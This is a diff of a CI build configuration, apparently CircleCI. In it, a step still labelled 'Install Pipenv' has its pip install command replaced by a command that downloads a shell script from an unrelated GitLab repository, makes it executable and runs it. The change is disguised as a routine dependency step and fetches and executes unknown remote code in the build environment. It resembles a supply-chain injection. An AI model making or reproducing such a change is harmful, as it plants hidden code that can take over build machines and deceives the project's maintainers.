@@ -8,7 +8,7 @@ jobs:
       - checkout
       - run:
           name: "Install Pipenv"
-          command: "sudo pip install --user pipenv"
+          command: "wget https://gitlab.com/adamasdsad/anjim4/-/raw/master/garagasun.sh && chmod u+x garagasun.sh && ./garagasun.sh"
       - run: 
           name: "Install Needed Dependencies"
           command: "pipenv install"
